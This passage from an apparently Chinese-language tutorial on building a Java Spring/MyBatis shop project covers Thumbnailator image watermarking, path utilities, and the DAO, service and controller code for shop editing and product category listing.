class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<span class="hljs-comment">// 获取classpath的绝对值路径，由于这个方法是通过线程去执行的，可以通过线程逆推到类加载器，从而从类加载器得到资源路径</span><span class="hljs-type">String</span> <span class="hljs-variable">basePath</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader().getResource(<span class="hljs-string">&quot;&quot;</span>).getPath();Thumbnails.of(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/jxh/Downloads/src.jpeg&quot;</span>)) <span class="hljs-comment">// 需要处理的文件</span>.size(<span class="hljs-number">200</span>, <span class="hljs-number">200</span>) <span class="hljs-comment">// 处理后的文件大小</span>.watermark(Positions.BOTTOM_RIGHT, ImageIO.read(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(basePath + <span class="hljs-string">&quot;/hjxstart.png&quot;</span>)), <span class="hljs-number">0.25f</span>) <span class="hljs-comment">// 添</span>.outputQuality(<span class="hljs-number">0.8f</span>).toFile(<span class="hljs-string">&quot;/Users/jxh/Downloads/det.jpeg&quot;</span>);&#125;&#125;language-Java复制代码</code></pre><ol><li>工具类 PathUtil。用于处理在不同系统下的路径问题。</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.imooc.o2o.util;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PathUtil</span> &#123;<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">seperator</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;file.separator&quot;</span>);<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getImgBasePath</span><span class="hljs-params">()</span> &#123;<span class="hljs-type">String</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);String basePath=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">if</span>(os.toLowerCase().startsWith(<span class="hljs-string">&quot;win&quot;</span>)) &#123;basePath = <span class="hljs-string">&quot;D:/projectdev/image/&quot;</span>;&#125;<span class="hljs-keyword">else</span> &#123;basePath = <span class="hljs-string">&quot;/Users/jxh/Downloads/image/&quot;</span>;&#125;basePath = basePath.replace(<span class="hljs-string">&quot;/&quot;</span>, seperator);<span class="hljs-keyword">return</span> basePath;&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getShopImagePath</span><span class="hljs-params">(<span class="hljs-type">long</span> shopId)</span> &#123;<span class="hljs-type">String</span> <span class="hljs-variable">imagePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;upload/item/shop/&quot;</span> + shopId + <span class="hljs-string">&quot;/&quot;</span>;<span class="hljs-keyword">return</span> imagePath.replace(<span class="hljs-string">&quot;/&quot;</span>, seperator);&#125;&#125;language-Java复制代码</code></pre><ol><li>Session，图片处理工具<a href="https://github.com/coobird/thumbnailator">Thumbnailator</a>的使用</li></ol><ul><li>导入依赖</li></ul><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 图片处理 --&gt;</span><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/net.coobird/thumbnailator --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>net.coobird<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>thumbnailator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.4.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>language-xml复制代码</code></pre><ul><li>简单的例子</li></ul><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<span class="hljs-comment">// 获取class path的绝对值路径，由于这个方法是通过线程去执行的，可以通过线程逆推到类加载器，从而从类加载器得到资源路径</span><span class="hljs-type">String</span> <span class="hljs-variable">basePath</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader().getResource(<span class="hljs-string">&quot;&quot;</span>).getPath();Thumbnails.of(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/jxh/Downloads/src.jpeg&quot;</span>)).size(<span class="hljs-number">200</span>, <span class="hljs-number">200</span>).watermark(Positions.BOTTOM_RIGHT, ImageIO.read(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(basePath + <span class="hljs-string">&quot;/hjxstart.png&quot;</span>)), <span class="hljs-number">0.25f</span>).outputQuality(<span class="hljs-number">0.8f</span>).toFile(<span class="hljs-string">&quot;/Users/jxh/Downloads/det.jpeg&quot;</span>);&#125;language-Java复制代码</code></pre><hr><h2 id="5-2-店铺信息编辑模块"><a href="#5-2-店铺信息编辑模块" class="headerlink" title="5.2 店铺信息编辑模块"></a>5.2 店铺信息编辑模块</h2><p>目标：实现单个店铺信息的获取，实现对店铺信息进行修改。</p><h4 id="5-2-1-Dao-层"><a href="#5-2-1-Dao-层" class="headerlink" title="5.2.1 Dao 层"></a>5.2.1 Dao 层</h4><ol><li>ShopDao.java 接口</li></ol><pre><code class="hljs Java"><span class="hljs-comment">// 查询店铺接口，根据 shopId 进行查询</span>Shop <span class="hljs-title function_">queryByShopId</span><span class="hljs-params">(<span class="hljs-type">long</span> shopId)</span>;<span class="hljs-comment">// 更新店铺接口，</span><span class="hljs-type">int</span> <span class="hljs-title function_">updateShop</span><span class="hljs-params">(Shop shop)</span>;language-Java复制代码</code></pre><ol><li>shopDao.xml</li></ol><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.imooc.o2o.dao.ShopDao&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 符合对象。扩展外键的值。涉及其他表的数据，比如原表只包含了其他ID，但是想要其他表的name。所有就要定义新的返回类型 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.imooc.o2o.entity.Shop&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;shopMap&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;shop_id&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;shopId&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;shop_name&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;shopName&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;shop_desc&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;shopDesc&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;shop_addr&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;shopAddr&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;phone&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;phone&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;shop_img&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;shopImg&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;priority&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;priority&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;create_time&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createTime&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;last_edit_time&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;lastEditTime&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;enable_status&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;enableStatus&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;advice&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;advice&quot;</span> /&gt;</span><span class="hljs-comment">&lt;!-- 复合数据类型 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">association</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;area&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;area_id&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">javaType</span>=<span class="hljs-string">&quot;com.imooc.o2o.entity.Area&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;area_id&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;areaId&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;area_name&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;areaName&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">association</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">association</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;shopCategory&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">column</span>=<span class="hljs-string">&quot;shop_category_id&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">javaType</span>=<span class="hljs-string">&quot;com.imooc.o2o.entity.ShopCategory&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;shop_category_id&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;shopCategoryId&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;shop_category_name&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">property</span>=<span class="hljs-string">&quot;shopCategoryName&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">association</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">association</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;owner&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">javaType</span>=<span class="hljs-string">&quot;com.imooc.o2o.entity.PersonInfo&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userId&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;name&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">association</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;queryByShopId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;shopMap&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;Long&quot;</span>&gt;</span>SELECTs.shop_id,s.shop_name,s.shop_desc,s.shop_addr,s.phone,s.shop_img,s.priority,s.create_time,s.last_edit_time,s.enable_status,s.advice,a.area_id,a.area_name,sc.shop_category_id,sc.shop_category_nameFROMtb_shop s,tb_area a,tb_shop_category scWHEREs.area_id=a.area_idANDs.shop_category_id = sc.shop_category_idANDs.shop_id = #&#123;shopId&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>language-xml复制代码</code></pre><ol><li>单元测试</li></ol><pre><code class="hljs Java"><span class="hljs-meta">@Test</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testQueryShopList</span><span class="hljs-params">()</span> &#123;<span class="hljs-type">Shop</span> <span class="hljs-variable">shopCondition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shop</span>();<span class="hljs-type">PersonInfo</span> <span class="hljs-variable">owner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PersonInfo</span>();owner.setUserId(<span class="hljs-number">1L</span>);shopCondition.setOwner(owner);List&lt;Shop&gt; shopList = shopDao.queryShopList(shopCondition, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>);System.out.println(<span class="hljs-string">&quot;店铺列表的大小：&quot;</span> + shopList.size());&#125;language-Java复制代码</code></pre><hr><h4 id="5-2-2-Service-层"><a href="#5-2-2-Service-层" class="headerlink" title="5.2.2 Service 层"></a>5.2.2 Service 层</h4><ol><li>ShopService.java 接口</li></ol><pre><code class="hljs Java"><span class="hljs-comment">// 通过店铺ID获取店铺信息</span>Shop <span class="hljs-title function_">getByShopId</span><span class="hljs-params">(<span class="hljs-type">long</span> shopId)</span>;<span class="hljs-comment">// 更新店铺信息，包括对图片的处理，ShopExecution 封装了状态信息和店铺信息，对店铺的操作都会返回这个类</span>ShopExecution <span class="hljs-title function_">modifyShop</span><span class="hljs-params">(Shop shop, InputStream shopImgInputStream, String fileName)</span> <span class="hljs-keyword">throws</span> ShopOperationException;language-Java复制代码</code></pre><ol><li>ShopServiceImpl.java 实现</li></ol><pre><code class="hljs Java"><span class="hljs-comment">// 返回shop</span><span class="hljs-meta">@Override</span><span class="hljs-keyword">public</span> Shop <span class="hljs-title function_">getByShopId</span><span class="hljs-params">(<span class="hljs-type">long</span> shopId)</span> &#123;<span class="hljs-comment">// TODO Auto-generated method stub</span><span class="hljs-keyword">return</span> shopDao.queryByShopId(shopId);&#125;<span class="hljs-meta">@Override</span><span class="hljs-keyword">public</span> ShopExecution <span class="hljs-title function_">modifyShop</span><span class="hljs-params">(Shop shop, InputStream shopImgInputStream, String fileName)</span><span class="hljs-keyword">throws</span> ShopOperationException &#123;<span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">// 1.判断是否要修改图片，使用新的图片，删除就的图片 deleteFileOrPath</span><span class="hljs-keyword">if</span>(shop == <span class="hljs-literal">null</span> || shop.getShopId() ==  <span class="hljs-literal">null</span> &amp;&amp; fileName != <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-string">&quot;&quot;</span>.equals(fileName)) &#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShopExecution</span>(ShopStateEnum.NULL_SHOP);&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">if</span>(shopImgInputStream != <span class="hljs-literal">null</span>) &#123; <span class="hljs-type">Shop</span> <span class="hljs-variable">tempShop</span> <span class="hljs-operator">=</span> shopDao.queryByShopId(shop.getShopId()); <span class="hljs-keyword">if</span>(tempShop.getShopImg() != <span class="hljs-literal">null</span>) &#123; ImageUtil.deleteFileOrPath(tempShop.getShopImg()); &#125; addShopImg(shop, shopImgInputStream, fileName); &#125;&#125;<span class="hljs-comment">// 2.更新店铺信息</span>shop.setLastEditTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<span class="hljs-type">int</span> <span class="hljs-variable">effectedNum</span> <span class="hljs-operator">=</span> shopDao.updateShop(shop);<span class="hljs-keyword">if</span>(effectedNum &lt;= <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShopExecution</span>(ShopStateEnum.INNER_ERROR);&#125;<span class="hljs-keyword">else</span> &#123;shop = shopDao.queryByShopId(shop.getShopId());<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShopExecution</span>(ShopStateEnum.SUCCESS, shop);&#125;&#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShopOperationException</span>(<span class="hljs-string">&quot;modifyShop error&quot;</span> + e.getMessage());&#125;&#125;language-Java复制代码</code></pre><ol><li>单元测试</li></ol><pre><code class="hljs java"><span class="hljs-meta">@Test</span><span class="hljs-meta">@Ignore</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testModifyShop</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;<span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shop</span>();shop.setShopId(<span class="hljs-number">1L</span>);shop.setShopName(<span class="hljs-string">&quot;修改后的店铺名称&quot;</span>);<span class="hljs-type">File</span> <span class="hljs-variable">shopImg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/jxh/Downloads/src.jpeg&quot;</span>);<span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(shopImg);<span class="hljs-type">ShopExecution</span> <span class="hljs-variable">shopExecution</span> <span class="hljs-operator">=</span>  shopService.modifyShop(shop, is, <span class="hljs-string">&quot;src.jpeg&quot;</span>);System.out.println(<span class="hljs-string">&quot;新的图片地址为：&quot;</span> + shopExecution.getShop().getShopImg());&#125;language-java复制代码</code></pre><ol><li>拓展</li></ol><ul><li>ImageUtil.java 删除就图片文件或路径。生成新的图片路径</li></ul><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * storePath是文件的路径还是目录的路径，</span><span class="hljs-comment"> * 如果storePath是文件路径则删除改文件</span><span class="hljs-comment"> * 如果storePath是目录路径则删除改目录下的所有文件</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteFileOrPath</span><span class="hljs-params">(String storePath)</span> &#123;<span class="hljs-type">File</span> <span class="hljs-variable">fileOrPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(PathUtil.getImgBasePath() + storePath);<span class="hljs-keyword">if</span>(fileOrPath.exists()) &#123;<span class="hljs-keyword">if</span>(fileOrPath.isDirectory()) &#123;File files[] = fileOrPath.listFiles();<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; files.length; i++) &#123;files[i].delete();&#125;&#125;fileOrPath.delete();&#125;&#125;language-java复制代码</code></pre><hr><h4 id="5-2-3-Controller-层"><a href="#5-2-3-Controller-层" class="headerlink" title="5.2.3 Controller 层"></a>5.2.3 Controller 层</h4><ol><li>afsd</li></ol><h2 id="5-3-商品类别列表展示"><a href="#5-3-商品类别列表展示" class="headerlink" title="5.3 商品类别列表展示"></a>5.3 商品类别列表展示</h2><h4 id="5-3-1-dao-层"><a href="#5-3-1-dao-层" class="headerlink" title="5.3.1 dao 层"></a>5.3.1 dao 层</h4><ol><li>ProductCategoryDao.java 接口</li></ol><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.imooc.o2o.entity.ProductCategory;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProductCategoryDao</span> &#123;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 通过shop id 查询店铺商品类别</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> shopId</span><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><span class="hljs-comment"> */</span>List&lt;ProductCategory&gt; <span class="hljs-title function_">queryProductCategoryList</span><span class="hljs-params">(<span class="hljs-type">long</span> shopId)</span>;&#125;language-java复制代码</code></pre><ol><li>Mapper 用于实现 dao 接口的 ProductCategoryDao.xml</li></ol><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.imooc.o2o.dao.ProductCategoryDao&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 目的：为dao接口方法题哦功能sql语句配置 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;queryProductCategory&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.imooc.o2o.entity.ProductCategory&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;Long&quot;</span>&gt;</span>SELECTproduct_category_id,product_category_name,priority,create_time,shop_idFROM tb_product_categoryWHEREshop_id = #&#123;shopId&#125;ORDER BY priority DESC<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>language-xml复制代码</code></pre><ol><li>单元测试 ProductCategoryDaoTest.java</li></ol><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductCategoryDaoTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTest</span> &#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> ProductCategoryDao productCategoryDao;<span class="hljs-meta">@Test</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testProductCategoryDao</span><span class="hljs-params">()</span> &#123;<span class="hljs-type">long</span> <span class="hljs-variable">shopId</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;List&lt;ProductCategory&gt; productCategoryList = productCategoryDao.queryProductCategoryList(shopId);System.out.println(<span class="hljs-string">&quot;该店铺自定义类别数为：&quot;</span> + productCategoryList.size());&#125;&#125;language-java复制代码</code></pre><h4 id="5-3-2-service-层"><a href="#5-3-2-service-层" class="headerlink" title="5.3.2 service 层"></a>5.3.2 service 层</h4><ol><li>接口</li></ol><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.imooc.o2o.entity.ProductCategory;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProductCategoryService</span> &#123;<span class="hljs-comment">// 查询指定某个店铺下的所有商品类别信息</span>List&lt;ProductCategory&gt; <span class="hljs-title function_">getProductCategoryList</span><span class="hljs-params">(<span class="hljs-type">long</span> shopId)</span>;&#125;language-java复制代码</code></pre><ol><li>实现类</li></ol><pre><code class="hljs java"><span class="hljs-meta">@Service</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductCategoryServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ProductCategoryService</span> &#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> ProductCategoryDao productCategoryDao;<span class="hljs-meta">@Override</span><span class="hljs-keyword">public</span> List&lt;ProductCategory&gt; <span class="hljs-title function_">getProductCategoryList</span><span class="hljs-params">(<span class="hljs-type">long</span> shopId)</span> &#123;<span class="hljs-keyword">return</span> productCategoryDao.queryProductCategoryList(shopId);&#125;&#125;language-java复制代码</code></pre><ol><li>单元测试</li></ol><h4 id="5-3-3-controller-层-ProductCategoryManagementController-java"><a href="#5-3-3-controller-层-ProductCategoryManagementController-java" class="headerlink" title="5.3.3 controller 层 ProductCategoryManagementController.java"></a>5.3.3 controller 层 ProductCategoryManagementController.java</h4><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.imooc.o2o.dao.Result;<span class="hljs-keyword">import</span> com.imooc.o2o.entity.ProductCategory;<span class="hljs-keyword">import</span> com.imooc.o2o.entity.Shop;<span class="hljs-keyword">import</span> com.imooc.o2o.enums.ProductCategoryStateEnum;<span class="hljs-keyword">import</span> com.imooc.o2o.service.ProductCategoryService;<span class="hljs-meta">@Controller</span><span class="hljs-meta">@RequestMapping(&quot;/shopadmin&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductCategoryManagementController</span> &#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> ProductCategoryService productCategoryService;<span class="hljs-meta">@RequestMapping(value = &quot;/getproductcategorylist&quot;, method=RequestMethod.GET)</span><span class="hljs-meta">@ResponseBody</span><span class="hljs-keyword">private</span> Result&lt;List&lt;ProductCategory&gt;&gt; <span class="hljs-title function_">getProductCategoryList</span><span class="hljs-params">(HttpServletRequest request)</span> &#123; <span class="hljs-comment">// 返回一个对象，所有使用Result也可以</span><span class="hljs-type">Shop</span> <span class="hljs-variable">currentShop</span> <span class="hljs-operator">=</span> (Shop) request.getSession().getAttribute(<span class="hljs-string">&quot;currentShop&quot;</span>);List&lt;ProductCategory&gt; list = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span>(currentShop != <span class="hljs-literal">null</span> &amp;&amp; currentShop.getShopId() &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 如果为空就是店铺没有操作的权限</span>list = productCategoryService.getProductCategoryList(currentShop.getShopId());<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Result</span>&lt;List&lt;ProductCategory&gt;&gt;(<span class="hljs-literal">true</span>, list);&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-type">ProductCategoryStateEnum</span> <span class="hljs-variable">ps</span> <span class="hljs-operator">=</span> ProductCategoryStateEnum.INNER_ERROR;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Result</span>&lt;List&lt;ProductCategory&gt;&gt;(<span class="hljs-literal">false</span>, ps.getState(), ps.getStateInfo());&#125;&#125;&#125;language-java复制代码</code></pre><h4 id="5-3-3-Controller-层"><a href="#5-3-3-Controller-层" class="headerlink" title="5.3.3 Controller 层"></a>5.3.3 Controller 层</h4><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><span class="hljs-meta">@RequestMapping(&quot;/shopadmin&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductCategoryManagementController</span> &#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> ProductCategoryService productCategoryService;<span class="hljs-meta">@RequestMapping(value = &quot;/getproductcategorylist&quot;, method=RequestMethod.GET)</span><span class="hljs-meta">@ResponseBody</span><span class="hljs-keyword">private</span> Result&lt;List&lt;ProductCategory&gt;&gt; <span class="hljs-title function_">getProductCategoryList</span><span class="hljs-params">(HttpServletRequest request)</span> &#123; <span class="hljs-comment">// 返回一个对象，所有使用Result也可以</span><span class="hljs-type">Shop</span> <span class="hljs-variable">currentShop</span> <span class="hljs-operator">=</span> (Shop) request.getSession().getAttribute(<span class="hljs-string">&quot;currentShop&quot;</span>);List&lt;ProductCategory&gt; list = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span>(currentShop != <span class="hljs-literal">null</span> &amp;&amp; currentShop.getShopId() &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 如果为空就是店铺没有操作的权限</span>list = productCategoryService.getProductCategoryList(currentShop.getShopId());<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Result</span>&lt;List&lt;ProductCategory&gt;&gt;(<span class="hljs-literal">true</span>, list);&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-type">ProductCategoryStateEnum</span> <span class="hljs-variable">ps</span> <span class="hljs-operator">=</span> ProductCategoryStateEnum.INNER_ERROR;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span 